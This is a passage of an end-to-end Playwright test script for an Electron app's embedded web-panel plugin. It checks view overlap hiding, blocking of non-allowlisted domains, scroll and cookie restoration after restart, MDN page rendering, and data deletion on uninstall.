const overlap = menuRect.x < web.x + web.width && web.x < menuRect.x + menuRect.width && menuRect.y < web.y + web.height && web.y < menuRect.y + menuRect.height;
const vMenu = (await views(app))[0];
const covMenu = await win.getAttribute('[data-testid="web-panel"]', 'data-covered');
await win.waitForTimeout(300);
const menuShot = await shot(app, win, 'web-menu-over-view.png');
let menuDiff = null;
if (hasX()) {
  const domShot = path.join(TMP, 'web-menu-dom.png');
  await win.screenshot({ path: domShot });
  // 菜单区域：X 屏幕上看到的像素 ≈ 主窗口 DOM 渲染的像素（菜单没被原生视图盖住）
  menuDiff = regionDiff(menuShot, domShot, { x: menuRect.x + 2, y: menuRect.y + 2, width: menuRect.width - 4, height: menuRect.height - 4 });
}
check('外观菜单与网页面板重叠时：网页视图隐藏、菜单完整显示在最上层（屏幕像素与 DOM 一致）', overlap && covMenu === 'true' && vMenu.visible === false && (menuDiff === null || menuDiff < 6), JSON.stringify({ overlap, covMenu, visible: vMenu.visible, menuPixelDiff: menuDiff === null ? 'n/a' : +menuDiff.toFixed(2) }));
const snap = await win.locator('[data-testid="web-snapshot"]').count();
check('网页被隐藏期间在原位置显示最近一帧截图（页面不“消失”）', snap === 1);
await win.click('[data-testid="appearance-button"]');
await win.waitForSelector('[data-testid="appearance-menu"]', { state: 'detached' });
const afterMenu = await boundsDev(app, win);
check('菜单关闭后网页视图立即恢复', afterMenu.dev <= 1, JSON.stringify(afterMenu.r));
// 命令面板、插件管理（对话框）
await win.keyboard.press('Control+Shift+P');
await win.waitForSelector('.palette', { timeout: 5000 }).catch(() => undefined);
await frames(win, 3);
const palCovered = await win.getAttribute('[data-testid="web-panel"]', 'data-covered');
const palVisible = (await views(app))[0].visible;
await win.keyboard.press('Escape');
await openManager(win, PID);
await frames(win, 3);
const pmCovered = await win.getAttribute('[data-testid="web-panel"]', 'data-covered');
const pmVisible = (await views(app))[0].visible;
check('命令面板与插件管理对话框打开时网页视图隐藏', palCovered === 'true' && palVisible === false && pmCovered === 'true' && pmVisible === false, JSON.stringify({ palCovered, palVisible, pmCovered, pmVisible }));
await win.evaluate((id) => document.querySelector(`[data-testid="pm-audit-${id}"]`)?.setAttribute('open', ''), PID);
await win.waitForTimeout(2300); // 审计列表每 2 秒刷新
const auditText = await win.innerText(`[data-testid="pm-plugin-${PID}"]`);
check('插件管理的审计记录中有网页拦截与系统浏览器记录', /网页访问被拦截/.test(auditText) && /用系统浏览器打开/.test(auditText), auditText.split('\n').filter((l) => /网页|系统浏览器/.test(l)).slice(0, 3).join(' / '));
await closeManager(win);
await boundsDev(app, win);

// ============================================================ 条目地址不在域名内 → domain-blocked 占位
await win.evaluate((a) => window.__kb.openItemRaw({ itemId: 'it-evil-web', sourceKind: 'web', adapterId: a, ref: 'https://evil.example.com/page', displayMode: 'in-app-web' }, 'below'), AID);
await win.waitForSelector('[data-item-id="it-evil-web"] [data-testid="placeholder"][data-kind="domain-blocked"]', { timeout: 10000 });
const phText = await win.innerText('[data-item-id="it-evil-web"] [data-testid="placeholder"]');
check('条目地址不在允许域名 → “已阻止访问”占位（只允许 developer.mozilla.org），其他面板正常', /只允许 developer\.mozilla\.org/.test(phText) && (await views(app)).length === 1, phText.split('\n').slice(0, 2).join(' / '));
const extBtnEnabled = await win.isEnabled('[data-item-id="it-evil-web"] [data-testid="placeholder-action-open-in-system-browser"]');
await win.click('[data-item-id="it-evil-web"] [data-testid="placeholder-action-open-in-system-browser"]');
await win.waitForSelector('[data-testid="dialog"]');
await win.click('[data-testid="dialog-ok"]');
await win.waitForTimeout(300);
const opened3 = await app.evaluate(() => globalThis.__opened.slice());
check('占位的“用系统浏览器打开…”可用：确认后以同一规则打开（https）', extBtnEnabled && opened3.includes('https://evil.example.com/page'), JSON.stringify(opened3));
await win.click('[data-item-id="it-evil-web"] [data-testid="placeholder-action-go-home"]');
await win.waitForFunction(() => document.querySelectorAll('[data-testid="web-panel"]').length === 2, null, { timeout: 20000 });
check('占位的“回到首页”：条目改为适配器首页并打开网页面板', (await views(app)).length === 2 && (await win.evaluate(() => window.__kb.items()['it-evil-web'].ref)) === 'https://developer.mozilla.org/zh-CN/');
await win.evaluate(() => window.__dock.getPanel('it-evil-web').api.close());
await win.evaluate(() => {
  const k = window.__kb;
  return k.flush();
});
await win.waitForTimeout(600);
check('关闭面板：对应网页视图被销毁', (await views(app)).length === 1, `视图数 ${(await views(app)).length}`);

// ============================================================ 重启恢复
await pageEval(app, 'window.scrollTo(0, 2100); 1');
await win.waitForFunction(() => Object.values(window.__kb.items()).find((x) => x.sourceKind === 'web')?.state?.data?.scrollY >= 2000, null, { timeout: 10000 }).catch(() => undefined);
await win.waitForTimeout(1200);
/** 视口顶部所在的小节（真实网站的图片/广告晚加载时，浏览器的滚动锚定会调整 scrollY，但看到的内容不变） */
const topSection = `(() => { let id = ''; for (const h of document.querySelectorAll('h2[id], h3[id], h2, h3')) { if (h.getBoundingClientRect().top <= 8) id = h.id || h.textContent.trim().slice(0, 40); } return id; })()`;
const secBefore = await pageEval(app, topSection);
idxErrorsSession1 = await indexErrors(win);
const beforeRestart = await webItem(win);
// 网页分区中留一个 Cookie（卸载时验证删除）
await app.evaluate(async ({ session }) => session.fromPartition('persist:kbweb.example.mdn-docs').cookies.set({ url: 'https://developer.mozilla.org', name: 'kb-test-pref', value: 'zh-CN', expirationDate: Date.now() / 1000 + 86400 }));
await win.evaluate(() => window.__kb.flush());
await app.close();
({ app, win } = await launch());
await watchIndexErrors(win);
await win.waitForSelector('[data-testid="web-panel"]', { timeout: 20000 });
check('重启后不再询问权限', (await win.locator('[data-testid="perm-dialog"]').count()) === 0);
await waitReady(win, 'https://developer.mozilla.org/');
await win.waitForTimeout(1500);
const rUrl = await curUrl(app);
const rY = await pageEval(app, 'Math.round(scrollY)');
const secAfter = await pageEval(app, topSection);
const restoreCall = (await webStats(app)).setScroll.at(-1);
const savedY2 = beforeRestart.state.data.scrollY;
metrics.restore = { savedY: savedY2, setScroll: restoreCall, finalY: rY, section: [secBefore, secAfter] };
// 宿主恢复调用必须准确到达保存的位置；之后真实网站晚加载的内容（图片、广告位）可能再移动页面，fixture 模式下要求最终位置也一致
const posOk = restoreCall && restoreCall.target === savedY2 && Math.abs(restoreCall.got - savedY2) <= 2 && (LIVE || Math.abs(rY - savedY2) <= 2);
check('重启后恢复 URL（无 query，保留 #intro）与滚动位置（宿主 setScroll 到达保存的位置）', rUrl === beforeRestart.state.data.url && posOk, JSON.stringify(metrics.restore));
const rb = await boundsDev(app, win);
check('重启后网页视图位置与面板一致', rb.dev <= 1, JSON.stringify(rb.r));
const ck = await app.evaluate(async ({ session }) => (await session.fromPartition('persist:kbweb.example.mdn-docs').cookies.get({ name: 'kb-test-pref' })).length);
check('网页分区持久（persist:）：Cookie 跨重启保留', ck === 1);

// ============================================================ B16b / B16c（SDK docs/验收示例.md）：兼容性表、交互示例、示例图片；被拦截的域名只应是遥测/同意管理类
const MAP_PAGE = 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/map';
const IMG_PAGE = 'https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/img';
/** 被拦截主机中允许出现的类型：遥测、统计、同意管理、广告（不影响阅读） */
const BENIGN_BLOCK = /(^|\.)(incoming\.)?telemetry\.mozilla\.org$|analytics|googletagmanager|google-analytics|doubleclick|googlesyndication|consent|onetrust|cookielaw|cookiebot|sentry|stats|metrics|ads?\./;
const hostOfUrl = (u) => { try { return new URL(u).host; } catch { return String(u).slice(0, 30); } };
const blockedHostsSince = async (n0) => [...new Set((await webStats(app)).blockedResources.slice(n0).map((r) => hostOfUrl(r.url)))];
/** 页面内深度查找（跨 shadow DOM）：兼容性表 */
const COMPAT_PROBE = `(() => {
  const all = (root, out = []) => { root.querySelectorAll('*').forEach((e) => { out.push(e); if (e.shadowRoot) all(e.shadowRoot, out); }); return out; };
  const els = all(document);
  const lazy = document.querySelector('mdn-compat-table-lazy, #browser_compatibility, #compat');
  if (lazy) { lazy.scrollIntoView({ block: 'start', behavior: 'instant' }); window.scrollBy(0, -110); }
  const t = els.filter((e) => e.tagName === 'TABLE').find((t) => /Chrome/.test(t.textContent) && /Firefox/.test(t.textContent) && t.rows.length >= 3);
  return t ? { rows: t.rows.length, text: t.innerText.replace(/\\s+/g, ' ').slice(0, 160) } : null;
})()`;
const runnerFrames = () => app.evaluate(async () => {
  const wc = [...globalThis.__kbWeb.views.values()][0].wc;
  const out = [];
  for (const f of wc.mainFrame.framesInSubtree) {
    if (f === wc.mainFrame) continue;
    let host = ''; try { host = new URL(f.url).host; } catch {}
    if (!/\.mdnplay\.dev$/.test(host)) continue;
    const info = await f.executeJavaScript(`({ ready: document.readyState, len: (document.body?.innerHTML || '').length, text: (document.body?.innerText || '').replace(/\\s+/g, ' ').slice(0, 120), imgs: [...document.images].map((i) => ({ host: (() => { try { return new URL(i.currentSrc || i.src).host; } catch { return ''; } })(), ok: i.complete && i.naturalWidth > 0 })) })`).catch((e) => ({ error: String(e) }));
    out.push({ host, ...info });
  }
  return out;
});
{
  const itB = await webItem(win);
  await win.evaluate((id) => window.__dock.getPanel(id).api.maximize(), itB.itemId);
  const n0 = (await webStats(app)).blockedResources.length;
  await pageEval(app, `location.href = ${JSON.stringify(MAP_PAGE)}; 1`);
  await waitReady(win, MAP_PAGE);
  await win.waitForTimeout(LIVE ? 3000 : 800);
  // 交互示例：在顶部；真实 MDN 点击 Run（shadow DOM 中的 #execute），读取控制台输出
  const ieInfo = await pageEval(app, `(async () => {
    const ie = document.querySelector('interactive-example, #interactive-example');
    if (!ie) return null;
    ie.scrollIntoView({ block: 'start', behavior: 'instant' }); window.scrollBy(0, -60);
    const deepText = (root) => { let t = ''; root.querySelectorAll('*').forEach((e) => { if (e.shadowRoot) t += ' ' + deepText(e.shadowRoot); }); return t + ' ' + (root.textContent || ''); };
    const run = ie.shadowRoot?.querySelector('#execute');
    if (run) { run.click(); await new Promise((r) => setTimeout(r, 2500)); }
    const cons = ie.shadowRoot?.querySelector('mdn-play-console');
    return { live: !!run, console: cons ? deepText(cons.shadowRoot || cons).replace(/\\s+/g, ' ').trim().slice(0, 200) : null };
  })()`);
  await win.waitForTimeout(800);
  const rf = await runnerFrames();
  const ieOk = !!ieInfo && rf.some((f) => f.ready === 'complete' && f.len > 0) && (ieInfo.live ? /2,\s*8,\s*18,\s*32/.test(ieInfo.console ?? '') : rf.some((f) => /2,8,18,32|2, 8, 18, 32/.test(f.text)));
  check('B16c 交互示例在网页面板中可运行（运行器来自 *.mdnplay.dev，输出 [2, 8, 18, 32]）', ieOk, JSON.stringify({ ieInfo, runners: rf.map((f) => ({ host: f.host, ready: f.ready, text: f.text?.slice(0, 60) })) }));
  await frames(win, 4);
  await win.waitForTimeout(600);
  await shot(app, win, 'web-mdn-interactive-example.png');
  // 兼容性表：在页面底部，滚到它并等待 bcd 数据
  let compat = null;
  for (let i = 0; i < 30 && !compat; i++) { compat = await pageEval(app, COMPAT_PROBE); if (!compat) await win.waitForTimeout(500); }
  await win.waitForTimeout(800);
  await pageEval(app, COMPAT_PROBE);
  await win.waitForTimeout(600);
  check('B16c 浏览器兼容性表正常显示（数据来自 bcd.developer.mozilla.org）', !!compat, JSON.stringify(compat));
  await shot(app, win, 'web-mdn-compat-table.png');
  // 示例图片（img 元素页面的交互示例）
  await pageEval(app, `location.href = ${JSON.stringify(IMG_PAGE)}; 1`);
  await waitReady(win, IMG_PAGE);
  let imgs = [];
  for (let i = 0; i < 24; i++) { await win.waitForTimeout(500); imgs = (await runnerFrames()).flatMap((f) => f.imgs ?? []); if (imgs.length && imgs.every((x) => x.ok)) break; }
  check('B16c 交互示例中的示例图片可见（全部加载成功）', imgs.length > 0 && imgs.every((x) => x.ok), JSON.stringify(imgs));
  const blocked = await blockedHostsSince(n0);
  const notBenign = blocked.filter((h) => !BENIGN_BLOCK.test(h));
  metrics.b16 = { blockedHosts: blocked, blockedHostsSinceRestart: [...new Set((await webStats(app)).blockedResources.map((r) => hostOfUrl(r.url)))], notBenign, imageHosts: [...new Set(imgs.map((x) => x.host))], runnerHosts: [...new Set(rf.map((f) => f.host.replace(/^[^.]+\./, '*.')))], compatRows: compat?.rows ?? null, console: ieInfo?.console ?? null };
  check('B16b 被拦截的外部资源只有遥测/同意管理类（兼容性数据、交互示例、示例素材的域名都未被拦截）', notBenign.length === 0 && !blocked.some((h) => /bcd\.developer\.mozilla\.org|mdnplay\.dev|mdn\.github\.io/.test(h)), JSON.stringify({ blocked, notBenign }));
  await win.evaluate((id) => window.__dock.getPanel(id).api.exitMaximized(), itB.itemId);
}

// ============================================================ 撤销 → 占位；卸载删除网站数据
await openManager(win, PID);
await win.locator(`[data-testid="pm-plugin-${PID}"] [data-testid^="perm-revoke-"]`).first().click();
await closeManager(win);
await win.waitForSelector('[data-testid="placeholder"][data-kind="permission-denied"]', { timeout: 10000 });
await win.waitForTimeout(300);
check('撤销 net 权限 → 网页面板立即换成 permission-denied 占位，网页视图被销毁', (await views(app)).length === 0);
await openManager(win, PID);
await win.click(`[data-testid="pm-uninstall-${PID}"]`);
await win.waitForSelector('[data-testid="uninstall-dialog"]');
const unText = await win.innerText('[data-testid="uninstall-dialog"]');
const siteLine = unText.split('\n').find((l) => l.includes('网站数据')) ?? '';
check('卸载对话框显示网站数据占用', /网站数据：\d/.test(siteLine) && !/无/.test(siteLine), siteLine);
await win.check('[data-testid="uninstall-delete"]');
await win.click('[data-testid="uninstall-confirm"]');
await win.waitForSelector('[data-testid="uninstall-dialog"]', { state: 'detached' });
await win.waitForTimeout(500);
const ck2 = await app.evaluate(async ({ session }) => (await session.fromPartition('persist:kbweb.example.mdn-docs').cookies.get({})).length);
check('卸载并选择“删除数据”：网页分区的 Cookie/存储被清除', ck2 === 0, `剩余 Cookie ${ck2}`);
await closeManager(win).catch(() => undefined);
await win.waitForSelector('[data-testid="placeholder"][data-kind="adapter-missing"]', { timeout: 10000 });
check('卸载后条目保留为“缺少适配器”占位（D3）', (await win.locator('[data-testid="placeholder"][data-kind="adapter-missing"]').count()) >= 1);

const rootStatus = await win.$$eval('[data-testid="index-status"]', (els) => els.map((e) => e.dataset.state + ' ' + e.textContent.trim()));
const idxErrs = [...idxErrorsSession1, ...(await indexErrors(win))];
check('根目录索引全程无错误（网页面板的审计/状态写入与索引 worker 并发写库不冲突）', rootStatus.length > 0 && !rootStatus.some((x) => x.startsWith('error')) && idxErrs.length === 0, JSON.stringify({ rootStatus, idxErrs: [...new Set(idxErrs)] }));
check('无未预期的控制台错误', consoleErrors.length === 0, consoleErrors.slice(0, 3).join(' | '));
await app.close();

const failed = results.filter((r) => !r.ok);
fs.writeFileSync(path.join(VERIFY, LIVE ? 'e2e-web-results.json' : 'e2e-web-fixture-results.json'), JSON.stringify({ when: new Date().toISOString(), metrics, results }, null, 2));
console.log(`\n${results.length - failed.length}/${results.length} 通过；模式：${MODE}；指标：${JSON.stringify(metrics)}`);
process.exit(failed.length ? 1 : 0);
